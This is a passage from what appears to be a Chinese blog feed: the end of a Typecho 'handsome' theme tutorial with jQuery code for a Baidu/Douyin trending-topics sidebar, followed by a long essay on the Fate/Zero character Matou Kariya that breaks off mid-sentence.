class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">//百度热搜排行榜</span><br><span class="line">function ss_hot()&#123;</span><br><span class="line">    if($(&quot;#sidebar&quot;).length &gt; 0)&#123;</span><br><span class="line">        if($(&quot;#baidu_hot&quot;).length)&#123;</span><br><span class="line">            $.ajax(&#123;</span><br><span class="line">                type:&quot;get&quot;, </span><br><span class="line">                url:&quot;https://api.gmit.vip/Api/BaiduHot&quot;,  </span><br><span class="line">                async:true,   </span><br><span class="line">                success:function(res)&#123;</span><br><span class="line">                    if(res.code == 200)&#123;</span><br><span class="line">                        $(&quot;#baidu_hot_num&quot;).html(res.data.length);</span><br><span class="line">                        var html = &#x27;&#x27;;</span><br><span class="line">                        var htmls = &#x27;&#x27;;</span><br><span class="line">                        for (var i = 0; i &lt; res.data.length; i++)&#123;</span><br><span class="line">                            if(i &lt; 10)&#123;</span><br><span class="line">                                hot = &#x27;&#x27;;</span><br><span class="line">                                if(i &lt; 3)&#123;</span><br><span class="line">                                    hot = &#x27;&lt;b class=&quot;badge bg-danger pull-left&quot;&gt;TOP&#x27;+(i+1)+&#x27;&lt;/b&gt;&#x27;;</span><br><span class="line">                                &#125;</span><br><span class="line">                                html += `&lt;div class=&quot;list-group list-group-lg list-group-sp col-xs-12 col-sm-12 col-md-12 col-lg-12&quot; style=&quot;margin-bottom: 0px;padding-right: 0px;&quot;&gt;&lt;a style=&quot;padding: 5px 5px 5px 5px;&quot; href=&quot;`+res.data[i].url+`&quot; target=&quot;_blank&quot; class=&quot;list-group-item no-borders box-shadow-wrap-lg&quot;&gt;&lt;span class=&quot;clear&quot;&gt;&lt;span class=&quot;text-ellipsis&quot;&gt;`+res.data[i].title+`&lt;/span&gt;&lt;small class=&quot;text-muted clear text-ellipsis&quot;&gt;&lt;b class=&quot;badge bg-dark pull-left&quot;&gt;No.`+(i+1)+`&lt;/b&gt; &lt;b class=&quot;badge bg-info pull-left&quot;&gt;`+res.data[i].hot+`&lt;/b&gt;`+hot+`&lt;/small&gt;&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;`;</span><br><span class="line">                            &#125;else&#123;</span><br><span class="line">                                htmls += `&lt;div class=&quot;list-group list-group-lg list-group-sp col-xs-12 col-sm-12 col-md-12 col-lg-12&quot; style=&quot;margin-bottom: 0px;padding-right: 0px;&quot;&gt;&lt;a style=&quot;padding: 5px 5px 5px 5px;&quot; href=&quot;`+res.data[i].url+`&quot; target=&quot;_blank&quot; class=&quot;list-group-item no-borders box-shadow-wrap-lg&quot;&gt;&lt;span class=&quot;clear&quot;&gt;&lt;span class=&quot;text-ellipsis&quot;&gt;`+res.data[i].title+`&lt;/span&gt;&lt;small class=&quot;text-muted clear text-ellipsis&quot;&gt;&lt;b class=&quot;badge bg-dark pull-left&quot;&gt;No.`+(i+1)+`&lt;/b&gt; &lt;b class=&quot;badge bg-info pull-left&quot;&gt;`+res.data[i].hot+`&lt;/b&gt;&lt;/small&gt;&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;`;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        $(&quot;#baidu_hot&quot;).append(html+&#x27;&lt;div class=&quot;text-center&quot; style=&quot;text-decoration: underline&quot;&gt;&lt;a id=&quot;all_baidu_hot&quot; class=&quot;infinite-scroll-request&quot;&gt;加载更多&lt;/a&gt;&lt;/div&gt;&#x27;);</span><br><span class="line">                        $(&quot;#all_baidu_hot&quot;).click(function() &#123;</span><br><span class="line">                            $(&quot;#baidu_hot&quot;).html(html+htmls);</span><br><span class="line">                        &#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;); </span><br><span class="line">        &#125;</span><br><span class="line">        if($(&quot;#douyin_hot&quot;).length)&#123;</span><br><span class="line">            $.ajax(&#123;</span><br><span class="line">                type:&quot;get&quot;, </span><br><span class="line">                url:&quot;https://api.gmit.vip/Api/DouYinHot&quot;,  </span><br><span class="line">                async:true,   </span><br><span class="line">                success:function(res)&#123;</span><br><span class="line">                    if(res.code == 200)&#123;</span><br><span class="line">                        $(&quot;#douyin_hot_num&quot;).html(res.data.length);</span><br><span class="line">                        var html = &#x27;&#x27;;</span><br><span class="line">                        var htmls = &#x27;&#x27;;</span><br><span class="line">                        for (var i = 0; i &lt; res.data.length; i++)&#123;</span><br><span class="line">                            if(i &lt; 10)&#123;</span><br><span class="line">                                hot = &#x27;&#x27;;</span><br><span class="line">                                if(i &lt; 3)&#123;</span><br><span class="line">                                    hot = &#x27;&lt;b class=&quot;badge bg-danger pull-left&quot;&gt;TOP&#x27;+(i+1)+&#x27;&lt;/b&gt;&#x27;;</span><br><span class="line">                                &#125;</span><br><span class="line">                                html += `&lt;div class=&quot;list-group list-group-lg list-group-sp col-xs-12 col-sm-12 col-md-12 col-lg-12&quot; style=&quot;margin-bottom: 0px;padding-right: 0px;&quot;&gt;&lt;a style=&quot;padding: 5px 5px 5px 5px;&quot; href=&quot;`+res.data[i].url+`&quot; target=&quot;_blank&quot; class=&quot;list-group-item no-borders box-shadow-wrap-lg&quot;&gt;&lt;span class=&quot;clear&quot;&gt;&lt;span class=&quot;text-ellipsis&quot;&gt;`+res.data[i].title+`&lt;/span&gt;&lt;small class=&quot;text-muted clear text-ellipsis&quot;&gt;&lt;b class=&quot;badge bg-dark pull-left&quot;&gt;No.`+(i+1)+`&lt;/b&gt; &lt;b class=&quot;badge bg-info pull-left&quot;&gt;`+res.data[i].hot+`&lt;/b&gt;`+hot+`&lt;/small&gt;&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;`;</span><br><span class="line">                            &#125;else&#123;</span><br><span class="line">                                htmls += `&lt;div class=&quot;list-group list-group-lg list-group-sp col-xs-12 col-sm-12 col-md-12 col-lg-12&quot; style=&quot;margin-bottom: 0px;padding-right: 0px;&quot;&gt;&lt;a style=&quot;padding: 5px 5px 5px 5px;&quot; href=&quot;`+res.data[i].url+`&quot; target=&quot;_blank&quot; class=&quot;list-group-item no-borders box-shadow-wrap-lg&quot;&gt;&lt;span class=&quot;clear&quot;&gt;&lt;span class=&quot;text-ellipsis&quot;&gt;`+res.data[i].title+`&lt;/span&gt;&lt;small class=&quot;text-muted clear text-ellipsis&quot;&gt;&lt;b class=&quot;badge bg-dark pull-left&quot;&gt;No.`+(i+1)+`&lt;/b&gt; &lt;b class=&quot;badge bg-info pull-left&quot;&gt;`+res.data[i].hot+`&lt;/b&gt;&lt;/small&gt;&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;`;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        $(&quot;#douyin_hot&quot;).append(html+&#x27;&lt;div class=&quot;text-center&quot; style=&quot;text-decoration: underline&quot;&gt;&lt;a id=&quot;all_douyin_hot&quot; class=&quot;infinite-scroll-request&quot;&gt;加载更多&lt;/a&gt;&lt;/div&gt;&#x27;);</span><br><span class="line">                        $(&quot;#all_douyin_hot&quot;).click(function() &#123;</span><br><span class="line">                            $(&quot;#douyin_hot&quot;).html(html+htmls);</span><br><span class="line">                        &#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;ss_hot();</span><br></pre></td></tr></table></figure><h2 id="pjax回调函数"><a href="#pjax回调函数" class="headerlink" title="pjax回调函数"></a>pjax回调函数</h2><p>如果开启pjax无刷新 需添加pjax回调函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss_hot();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typecho魔改 </tag>
            
            <tag> handsome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Berserker&amp;间桐雁夜——隐匿于黑夜中的苍魂</title>
      <link href="/393.html"/>
      <url>/393.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>“一个人知道自己是为了什么而活着，他就能忍受任何生活。”——尼采</p></blockquote><p>行为人有意为一定行为，必然包含着其对客观对象的激情抑或赞同的情感，包含着其行为的性质能够作用于客观对象（物或他人）从而获得迎合自己内心的情感的反馈，包含着其行为期待得到他人能够对此产生一种共鸣从而反馈而来的赞同，包含着期待他人能够产生一种和他内心相一致的情感。然则，请允许我在此不论述行为人的行为只作用于物这方面，当他人对待行为人的情感的方式，未能让行为人所接受，抑或说是未能让行为人所理解，在感情相悖的情况下，因为产生误解，而将导致行为人和他人之间的不快之情产生（这当然得有着这么一个前提存在，就是行为人有期待之意味）；在行为人对待的是特定、特殊（所爱之人、重要的人）的客观对象之时，这种负面的情感亦将被放大，从而将有可能掩盖理性，产生冲动。</p><h2 id="无尽的心殇"><a href="#无尽的心殇" class="headerlink" title="无尽的心殇"></a>无尽的心殇</h2><blockquote><p>那不眠夜，我只身在窗边的书桌旁。<br>感叹——</p><p>曾经，不，我一直存活在这片黑暗的天空之下。<br>夜晚，沉睡之时，却是属于我的灵魂归宿。<br>孓然伫立于夜灯之下，苍然依靠墙隅，这个世界仿佛就剩下我一个人。<br>孤独，它闪动着惺忪的双眼，在寒风中微微打颤，瞬间吐露出一丝疲倦。<br>蹒跚在这世界冰冷的角落，眷恋着从我身上已经消逝的东西，我只是黑夜的附随物，丢失了白夜里徒然的黑涩。<br>眼前是一座阴森的林子，月色弥漫在我的脚下，蔓延在背后的深邃之影，狰狞的冰手强行牵扯着我，也许我不该逃离绝望，因为我属于这里。<br>通往幽林深处的小径，匍匐着些许尖石，它们掂量着我的脚的重量，脚板差点被戳穿；如同灵魂漫步在针毡上，遍体鳞伤，「你要知道，当黑暗来临之际，就连地上的石头也将难以幸免于灾厄。」<br>银发凌乱于空，伴随着肉体的钻心刺痛，灵魂就像被风蹂躏的流海，摇曳在名为「死亡」的边缘。<br>我，更像是来自黑夜的从者，降临之际，它吞噬了所有阳光。<br>我，割舍了一切，丢失了一切；最后，连那无眠之夜，独自梦着而笑，都是假的。</p></blockquote><p><img src="https://cos.gjcloak.xyz/pigo/202302200842046.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h3 id="黑夜里的独行者"><a href="#黑夜里的独行者" class="headerlink" title="黑夜里的独行者"></a>黑夜里的独行者</h3><p>间桐雁夜，被称作是“一个具有反骨精神的人”，其本身有着优秀的魔术深造资质，却因为自身反感家族的魔术修炼方式（虫术），而毅然挣脱家族的束缚，离开对他来说犹如炼狱的家。他有他想做的事情，他也有他喜欢的人，平淡的生活和温和的爱好，注定他将成为一个普通人，他也只能作为一个普通人去享受这些幸福；如果超越了身份的界限，昔日的幸福亦将被销毁殆尽。</p><p><img src="https://cos.gjcloak.xyz/pigo/202302200843780.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h3 id="间桐脏砚的专场"><a href="#间桐脏砚的专场" class="headerlink" title="间桐脏砚的专场"></a>间桐脏砚的专场</h3><p>当时，作为被间桐脏砚认可的家督继承人，雁夜却因为厌恶家族的魔道而出走，在外自力更生。在表面上，脏砚好像根本没有阻止雁夜离家，在我眼里这是个并非正常的事情。间桐脏砚，以前也是想实现和卫宫切嗣一样的理想而踏上夺取圣杯之路，却因为恐惧自己的死亡，而在实现自己的理想之路上逐渐忘掉了初衷，转而追求不死之术，他能够为了让雁夜有参加圣杯战争的资格，而施加刻印虫摧残雁夜的肉体，让雁夜召唤的Servant附加狂化状态，急剧缩短雁夜的生命；对这种为了能够实现他的现有理想而不惜折磨雁夜，我就对雁夜能够在这个家里拒绝虫术并完整地离家出走之事表示深深不解，脏砚怎么可能会让一个很好的傀儡就这么离开他的控制？当时远坂时臣已经和禅城葵结婚了，如果这么轻易放走雁夜，是脏砚的一个庞大计划的一环的话，那么这个阴谋也太毛骨悚然了，因为他必须得经过多重博弈：雁夜最终会因为葵的事情而和时臣对立，期待远坂家能够有多个子嗣，然后以家族没有优秀的魔术传续之人的借口，领养远坂家的人，间接利用葵完成他本来已化为泡影的计划，同时为可能将会发生的下一次圣杯战争做准备。当然，我也考虑了，是否脏砚那时候动了私心，对雁夜这个有血亲的人，始终不想逼迫、下不了手？这个问题，我现在也没有想明白，不过这也算是本文的一个小插曲吧，毕竟这不是本文所要涉及到的内容，当然如果真的是脏砚的阴谋，那么他真的是成功了——得到了樱，还顺便拉雁夜去为了他的理想作垫背。</p><p><img src="https://cos.gjcloak.xyz/pigo/202302200844991.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h3 id="间桐雁夜的人生の一"><a href="#间桐雁夜的人生の一" class="headerlink" title="间桐雁夜的人生の一"></a>间桐雁夜的人生の一</h3><p>雁夜走出了家族的阴影，也失去了他的最爱，他那时候最大的遗憾，估计就是没有认真地去表白过吧。但是，这时候一切已晚，他完全可以从此远离葵而躲避以后可能会发生的不必要的悲伤，但是他却一直在葵身边，守护着他的那份爱，他还是一如既往，爱着葵，同时也善待葵的两个女儿——凛和樱。也许，那时候雁夜可能祈祷葵和她的两个女儿能够获得幸福，但是这种想法在现在却是种幼稚的措辞。生存在魔术家族里，很多事情不是雁夜想得那么简单，雁夜本来可以是唯一一个能够完好无损地走出魔术家族的人，但是他却未能理解魔术带给人们心里多少美好而可怕的憧憬，这憧憬的背后的阴影又是融入了多少死亡和鲜血。当他还沉浸在就这么以自己的方式对待葵和她的两个女儿，命运的齿轮毫不痛惜地将他的希望碾压得粉碎，远坂家对待樱的方式让他骤然痛苦心生，樱踏入间桐家的那一刻，她的人生也将由此而被摧毁了大半。</p><p>雁夜痛恨自己，他发现自己对待樱的方式，根本就不能守住她的幸福。雁夜他只是对樱的命运所悲愤，然而远坂时臣和远坂葵表面上（其实心里也是吧，但是他们没有表示得很入骨）却对此并无太大的感触，而雁夜他根本没察觉到远坂葵对这件事的真实反映，而且很不自然地就认为葵在远坂家肯定也不是幸福的，她爱她的女儿，而时臣却没有顾及葵的感受，把女儿送给了间桐家，对雁夜来说，那简直是将樱送入地狱的门口，因此而认为是时臣一直没有在意葵和他的两个女儿（其实有一半是这样吧，但是雁夜却忽视了自己的看法存在的缺陷，就是他把葵当成普通人了），从而对时臣的憎恨由心而生，都是时臣的错，让葵和樱不幸福。在这里，很多人会考虑这么一个问题，就是雁夜那时候憎恨时臣，这种愤怒是否还涉及到当时禅城葵被时臣从他身边夺走的时候，他内心对时臣的嫉妒和愤恨？对自己心爱之物被人所占有之事，任何人都会有着一种失去之痛和心有不甘，很多人都认为雁夜那时候的恨还因为对时臣的嫉妒和失去了自己的最爱的痛苦。但是这种对雁夜的人格的贬低态度我却不认同，雁夜他没有嫉妒过时臣。</p><p>“行为人有意为一定行为，必然包含着其对客观对象的激情抑或赞同的情感，包含着其行为的性质能够作用于客观对象（物或他人）从而获得迎合自己内心的情感的反馈，包含着其行为期待得到他人能够对此产生一种共鸣从而反馈而来的赞同，包含着期待他人能够产生一种和他内心相一致的情感。”这是我上文就说的，如果我们能够设身处地去理解雁夜的行为，我们就能够知道，“嫉妒”放在雁夜身上是多么不妥。雁夜的目的是想让葵幸福，所以他才一直在葵身边，守护着葵，他没有任何诋毁时臣的想法和动作，而是作为一个正常人在他心爱的人的身边，就是因为自己对葵的爱是多么深刻，从而想用自己的方式去让葵有一天能够感受到自己的情意，一方面也有着一种表现自己在人格上根本不比他人差的倾向。然而，他的理想和希望，被现实无情地摧残，他人根本不认同他的期待，他一直在表现自己，却没能让他人产生能够让自己欣慰的感情。他羡慕他人能够享受到他未能得到的幸福，他却从来没有嫉妒过任何人，他从来没有因为自己的一无所有而憎恨过任何人，他是因为他一直想表现的自己的感情遭到他人的怀疑和否定，而心生萧然，悲痛难以自已。也许，他人对待自己所付出的感情以一种难以理解和反感，我们都会觉得震惊而不可理喻，因为我们需要的也许只是那么简单的寥寥几句话、一个微笑。而时臣，得到了葵，还有两个可爱的女儿，他在雁夜心里是一个幸福的人，但是他却在雁夜眼里，表现着“得到了一切，却蔑视一切”的感觉，这分明是对雁夜所追求的那些事物的间接不认同，这也是雁夜所为之愤怒的原因之一；他责怪时臣得到了他想要的一切却又否定了他想要的那一切，他憎恨为什么时臣不会给葵和樱幸福却依然这么剥夺她们的幸福，他不是在“嫉妒”，而是因为他的内心对葵、对樱、对他所追求之物的感情的“尊严”受到了莫大的耻辱，这些方面才是他愤怒的主要原因（抱歉咯，凛，咱先把你晾一边了）。</p><p><img src="https://cos.gjcloak.xyz/pigo/202302200844751.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h3 id="间桐雁夜的人生の二"><a href="#间桐雁夜的人生の二" class="headerlink" title="间桐雁夜的人生の二"></a>间桐雁夜的人生の二</h3><p>他不能原谅时臣如此“践踏”他的内心，而且他也难以去想象葵和樱以后还有什么幸福可言，他想去拯救，他想去守护，他茕然一身，毅然返回那对他来说是地狱的家，毫不犹豫地和间桐脏砚谈判，如果这次圣杯战争他赢得圣杯，间桐家就要放过樱。当然，雁夜也是考虑到这么一件实事，樱过继到间桐家，是因为间桐家除了他自己之外已经没有了合适的下一任家督，而他却因为厌恶家族的魔道而不想去肩负这个家族给他的使命，这样一来樱的命运其实有一部分是他导致的（这不能怪雁夜，他在离家出走的时候，根本还没有樱的存在）。如果在这方面能体现出雁夜本身有着一种“自责”的心态的话，我觉得有待商榷。</p><p>为了守护葵和樱的“幸福”，为了捍卫自己的尊严，他想证明自己，他想让时臣看看，他更想让葵看看，他并不比任何人差，他完全有资格得到他想要的幸福；他因为没有受过魔术的训练，从而想在短时间内达到圣杯战争的魔力资格，必须将刻印虫打入体内。这种和“寻死”没有任何区别的行为，更可以这么说，这比普通的死亡更加痛苦的事情（被刻印虫活活折磨死）雁夜都能接受，他的决心和坚强绝非一般人所能想象。“然汝当以混沌自迷双眼，侍奉吾身，汝即囚于狂乱牢笼者，吾即手握其锁链之人！”抱着对未来的憧憬，对梦想的执着，他不惜让自己的生命因此流逝，也要努力去奋战到底，在召唤Servant的时候，旁边的间桐脏砚嘴角一拧，观察着雁夜的背影和痛苦，心情非常愉快。雁夜可以违背家族的意愿而离开魔术，却为了拯救他心中所一直紧揣的爱而不惜违背自己的意愿，付出生命；这让间桐脏砚非常反感，同时在他眼里会有着雁夜心里原来一直都认为他人的幸福比自己更重要的想法，而对雁夜进行了精神上的折磨和惩罚——让Berserker狂化，既然想死，就在死去的过程中呈上最后的愉悦吧。</p><p>我想起了以前不知道在哪里看过的一句话，“即使你是个平凡的人，你也能够成为英雄。”对雁夜的这种为了自己心中所重视的人的幸福而甘愿牺牲自己，很多人都称其为“英雄的壮举”。我就不去考虑这个是对雁夜的褒奖还是贬低，我想说的是，从雁夜的梦想就可以看出，他是一个非常单纯而伟大的普通人。我们心中对任何事物的爱，是多种多样的，我们很少回去考虑将喜欢这个事物的程度和那个事物的程度一起对比，看看哪个事物会让我们更喜欢；当然，对于这种“爱”来说，有时候在我们心里，对某种事物、某人的情感，也许在一些情况下不会等同。我们谈论他人的感情，也许除了用调侃并附带一种不严肃的笑话来进行之外，再也没有比用其他方法来进行讨论会更加让我们感兴趣了；然而，也许我们可以这么不严肃地对待雁夜的感情，但是至少我们要尊重他的感情。简单而美好的事物，对雁夜来说却是那么高不可攀，他能容忍别人对他的唾弃，他能容忍为了追求这份美好而承受的各种肉体上、精神上的痛，他能容忍“死亡”随时在他的生命中划个句号。他重视着这份他一直坚强地守护着的感情，无论是对远坂葵还是对凛、樱，他爱她们，他更加希望她们能够过上更加“美好”的、“幸福”的生活，也许脱离魔术的束缚，无论去哪里，生活都将是一个全新的开始。</p><p>单单就是那一份执着，让我深深感动着。间桐雁夜，不惜付出生命的代价，即使自己即将被丑陋的刻印虫吞噬，即使自己即将被黑暗所撕碎，即使自己即将孤独终了，他也想好好地守护他认为应该守护的东西。如果他并不是一个普通人的话，这种悲惨的命运将引来更多人的深深叹息吧；可惜，作为一个普通人，做出如此重大的牺牲，这种由他自己内心发出的对他的梦想最真实的呐喊，却让很多人都觉得是一种愚蠢而轻率的行为。也许换做是其他人，设身处地为自己想一下吧，如果这种命运降临在自己身上，也许自己会选择明哲保身，不会有着如此强烈的情感和真实的行为，否则自己就是愚蠢而他人将为此震惊。但是，即便我们如何看待这份来自我们内心对此的真实想法，我们却永远无法理解雁夜对他所持有的那份感情的执着。我只能为他默哀，我为所付出他的爱深深震撼了，在现实中，也许再也没有比雁夜更加多情的人了。</p><p><img src="https://cos.gjcloak.xyz/pigo/202302200845232.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h3 id="间桐雁夜的人生の三"><a href="#间桐雁夜的人生の三" class="headerlink" title="间桐雁夜的人生の三"></a>间桐雁夜的人生の三</h3><p>间桐雁夜一开始根本没有想杀死远坂时臣的念头。在Berserker第一次现身，和Archer吉尔伽美什一起对着干的时候，雁夜在一晦暗的角落中很满意地笑了，他终于给时臣一点颜色看看了，他内心的那种因为时臣没有给与葵和樱幸福却反而剥夺了她们应该得到的幸福以及对自己的心里的情感的不认同而受到了羞辱而产生的憎恨，因为Berserker的暴走和Archer对峙而得到了一丝对时臣的报复之后的快感。雁夜那时候只想向时臣，以及所有人，证明自己，证明自己并不比任何人差。他在将刻印虫打入体内的时候，便已经抛弃了他的生命，他已经是不奢求会和葵在一起了，因为他没有实现这个愿望的条件了，他只想让葵离开时臣，让葵、樱和凛永远“幸福”地活着，时臣在她们身边只会摧毁这种可能性。<br>雁夜对时臣动其杀心，是Caster在未远川上召唤海魔，各Master一起过来消灭Caster的时候，雁夜和时臣在对峙的时候之间的对话，让雁夜骤然暴怒而决定杀了时臣。</p><blockquote><p>“你已经变得不似人形了啊，间桐雁夜。我真没想到，曾经放弃了魔道的你，却还留恋着圣杯，甚至不惜变成这般面貌也要回来。光是你现在这副丑态，就足以让人非议你们间桐家的堕落了。”<br>“远坂时臣！我只想问你一句话，为什么你会把樱交到了脏砚的手上？？”<br>“什么？这是你在这种场合下该在意的事情吗？”<br>“回答我！时臣！”<br>“真是多此一问，当然只是为了让我的爱女在未来能够得到幸福。”<br>“你说什么？”<br>“只要是有两个子嗣的魔术师，终究都会有这样的烦恼，能够得以传授秘术的只有其中一人。也就是说，会面临让一个孩子泯然于凡俗的两难抉择。而且我的妻子实在是太过优秀的母体，无论是凛还是樱，从一出生就都拥有着极为少见的素质，两个女儿全都需要魔道名门给予的庇护。为了其中一人的未来，断绝另一人所蕴含的可能性，身为父亲，会有人愿意看到这样的悲剧吗？”<br>“凡…俗…这个男人……竟把那一日的母女天伦，以「凡俗」二字概括，弃之不顾吗？”<br>“为了让姐妹二人的才能都得到发挥，除了过继给别人别无他法。因此，间桐家的提议无异于上天的恩赐。只要是知晓圣杯存在的一族，到达「根源」的可能性，便也会高上许多。所谓魔术师，便是生而拥有「力量」之人；更是终有一日，将会获得「更强力量」之人。在对这一命运做好思想准备之前，那责任便早已流淌在血液中，那就是「生为魔术师的子嗣」的事实。即便我无法完成使命，还有凛；倘若就算是凛也无法完成，还有樱……她们会继承我远坂家的夙愿。”<br>“你这混帐……是想让两姐妹同室操戈吗？”<br>“就算最后是这样的局面，我的后裔们也是幸福的。”<br>“什么？”<br>“胜利便可以获得无上殊荣，失败也足以给祖先增光。还有比这更没有后顾之忧的抉择吗？”<br>“你……真是疯了！”<br>“看来我是对牛弹琴了，尤其是你这个不理解魔道的崇高，甚至一度背离了它的叛道者。”<br>“开什么玩……我绝对饶不了你们，你们这些肮脏的魔术师们，我要杀了你……无论是脏砚，还是你……我都要斩尽杀绝！”<br>“因为你拒绝成为家主，樱才得以继承间桐家的魔术。按理来说，我倒应该感谢你才是。但我仍然无法原谅你这样的男人，逃避了血脉重责的软弱，以及对这一举动毫无悔意的卑劣，间桐雁夜可谓是魔道之耻。既然狭路相逢，便只能将你诛杀。”<br>“别开玩笑了……你这畜生！”<br>“此言差矣。自己背负起责任，这是生而为人最起码的条件。而做不到这一点的，才是——远不如人的狗啊，雁夜。”<br>“虫群啊，将他吞噬，吞噬殆尽！”</p></blockquote><p>看完这段对话，我一直在想当时雁夜是基于什么样的感情而想去杀时臣。</p><p>当然在此，我不会对Type-Moon的魔术世界观多有论述，我也不想牵扯雁夜眼里的世界到底是怎么样；我只能说雁夜的身份是一个比较特殊的存在，他曾经是魔术家族的人，却毅然舍弃自己本来应该会得到的魔术师身份，只是因为他厌恶自己家族的魔道，他是个普通人，度过了那么平静而美好的岁月，最后却被迫返回魔术师的世界里，被迫必须得正视魔术师的世界里的种种残酷的现实。也许处在两个不同的“世界”中的两个人，在思想上的冲撞总会异常激烈，我们在现实社会中所不允许的乱伦、不人道事情，在魔术师的世界中却是习以为常的事情。观念的截然不同，必将导致两者会水火不容（还真巧，雁夜的水属性魔法，而时臣的是火属性）；但是，恰如时臣所言，生而为人，却得被剥夺享受作为一个正常人所应该享有的很正当的幸福，这些幸福也许在魔术师的世界中根本就不是举足轻重的事情。这让我觉得这还是作为一个人能够并且应当存活的一个世界么？也许，在离开魔术的那段现实社会中的生活，让雁夜感受到了作为一个人真正的意义，然而返回这个魔术师的世界，却让他当然不适应甚至是憎恶这些黑暗而丑陋的事物。当然，站在自己的立场上进行慷慨激词是一件非常容易的事情，然而谁又能够愿意去站在与自己的立场截然不同而且明显违背这个社会常识的立场上为对方设身处地地思考呢？承认魔术世界里的阴暗，那么我们也即将不得不接受它确实存在于此，而且延续了好久好久，它已经不能算是一种坏的事物存在在这个世界上，却是这个世界的一种富有独立性的延伸，它已经是一个独立于现实的世界。这种隔阂实在太可怕，而导致普通人根本不能理解，即使理解了也不能接受魔术师的想法，这也难怪雁夜会抓狂。</p><p>其实雁夜这时候已经是饱经Berserker的无止尽的魔力摄取而导致刻印虫对身体的摧残，他的灵魂已经是被折磨得不堪重负。他仿佛看到了时臣身边，站着葵、凛还有樱，她们都是单纯地流露微笑，他突然间心疼了，他已经不知道那种表情到底是不是真的。他听完了时臣对他所追求的那种平凡的“幸福”以及对凛和樱以后可能将面临的命运的评价，已经是脱离愤怒了，他怨恨时臣为什么就要这样蔑视他所追求的事物，他怨恨时臣为什么就要这样践踏他作为一个普通人所抱有的那种感情的尊严，他怨恨时臣为什么夺走了他的最爱却未能珍惜，他怨恨为什么魔术师会有着如此惨无人道的理念，他怨恨为什么他人就不能够认同自己的想法而一味责备、折磨着自己，他更加怨恨为什么自己只是为了实现那么简单而美好的愿望却遭到魔术如此强烈而刻骨的痛苦摧残。他恨时臣，他恨脏砚，他恨这个魔术师的世界，他觉得他现在这样子、承受了多少痛苦，都是因为时臣的错，他直接将所有的悔恨、憎恨、痛苦的情绪都宣泄到时臣身上，把矛头直接对向了时臣。时臣原本应该对自己把女儿过继到间桐家一事感到羞耻的，但是这种剧情的剧本也只能在雁夜的心中长存了，“时臣，你去死吧。也就只有死，才能抵消你所犯下的错误”，也许当时雁夜的内心就这么疯狂地决定下来了，杀了时臣。在和时臣对决的过程中，雁夜的实力明显不敌时臣，而差点被时臣所杀，最后被言峰绮礼所救，从而即将踏入被人愉悦的最后的可悲的命运。</p><p><img src="https://cos.gjcloak.xyz/pigo/202302200845929.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h3 id="间桐雁夜的人生の四"><a href="#间桐雁夜的人生の四" class="headerlink" title="间桐雁夜的人生の四"></a>间桐雁夜的人生の四</h3><p>那次对决的失败，让雁夜的内心的阴暗更加滋长。雁夜本身就对现实怀着一种恨意，对命运的不满之人总会对命运进行抵抗，即使这种抵抗在命运的脚下是多么微不足道。慢慢的，他虽然还是抱有着对自己的梦想的希翼，然而他却因为憎恨而迷茫，迷失了自己所应当面对的事物。其实，在我们眼里，雁夜的梦想是终究不可能实现，因为他面对的可是一个多么庞大的魔术世界的体系，他在这里已经无能为力了，更何况他做了这么多只是单纯地出自自己内心而行，却根本没有考虑他人是否因此而领情抑或是否被他人所理解、认同。他也同样迷失了前进的方向，在无尽的黑夜里，掠过一丝惨白，始终徘徊在罪恶的混沌和憎恨的深渊之中，而未能明智地考虑多方面。即使让自己杀了时臣又能怎么样？他对这个问题根本没有认真去思考，只是把所有的降临于自己身上的不幸所产生的痛苦和憎恨的错都推到别人身上。“行为人其行为以及基于这种行为作出所把持的动机，有影响于他人。那么，对他人所造成的有利的或者有害的（这里不考虑没有任何得失的行为），如果是有利的话，行为人的行为动机倘若不被他人所允许，倘若不合宜于社会的准则，抑或行为人的影响了他的行为的感情未能激起他人对此的合宜的激情、赞同、理解，由此得到这种行为人所给与他的利益的人对行为人的感激之情将不被他人所承认。”更何况是面对那些和自己的想法截然不同的事物，他人如果不能够认同自己的情感，那么自己如果未能理解他人的想法，则将导致非常沉重的负面激情产生。冲动总会扼杀理智，雁夜在脑海里想着如何杀死时臣的时候，他已经忘记了时臣是葵的丈夫，是凛和樱的父亲；而且，杀死了时臣，难道就会让葵觉得欣慰和解脱，而不是憎恨自己破坏了她的家庭么？这也就蹴就了雁夜的悲剧。</p><p>在教堂里的那一幕言峰绮礼为雁夜准备的最残酷的闹剧，直接断送了他最